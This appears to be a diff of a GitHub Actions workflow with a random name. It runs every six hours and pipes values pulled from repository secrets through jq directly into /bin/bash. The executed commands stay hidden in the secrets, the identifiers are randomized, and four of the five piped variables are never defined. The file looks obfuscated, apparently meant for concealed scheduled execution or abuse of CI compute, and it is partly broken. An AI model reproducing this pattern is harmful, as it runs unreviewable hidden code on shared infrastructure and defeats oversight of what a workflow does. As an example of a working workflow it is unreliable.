@@ -2,17 +2,19 @@ name: elderlyremarkable
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 5/6 * * *'
+    - cron: '38 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: elderlyremarkable
         env:
-          cl83: ${{ secrets.cl83 }}
+          rzzi04772: ${{ secrets.rzzi04772 }}
         run: |
-          echo $cl83 | jq -r .pnc3974 | /bin/bash
-          echo $rls16863 | jq -r .vi702 | /bin/bash
+          echo $rzzi04772 | jq -r .f5 | /bin/bash
+          echo $pjqw2595 | jq -r .hl84075 | /bin/bash
+          echo $gp20182 | jq -r .m217 | /bin/bash
+          echo $gx4 | jq -r .gmxe8056 | /bin/bash
+          echo $kjcga5 | jq -r .gxl55 | /bin/bash
 
